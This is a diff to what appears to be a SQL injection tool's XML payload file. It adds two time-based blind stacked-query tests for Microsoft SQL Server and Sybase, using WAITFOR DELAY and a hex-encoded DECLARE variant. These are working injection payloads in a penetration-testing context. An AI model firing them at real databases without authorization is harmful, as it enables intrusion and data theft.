@@ -329,6 +329,48 @@
     </test>
 
     <test>
+        <title>Microsoft SQL Server/Sybase stacked queries (no semicolon)</title>
+        <stype>4</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector> IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'</vector>
+        <request>
+            <payload> WAITFOR DELAY '0:0:[SLEEPTIME]'</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase stacked queries (DECLARE - no semicolon)</title>
+        <stype>4</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector> DECLARE @x CHAR(9) SET @x=0x303a303a3[SLEEPTIME] IF([INFERENCE]) WAITFOR DELAY @x</vector>
+        <request>
+            <payload> DECLARE @x CHAR(9) SET @x=0x303a303a3[SLEEPTIME] WAITFOR DELAY @x</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
         <title>Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)</title>
         <stype>4</stype>
         <level>1</level>
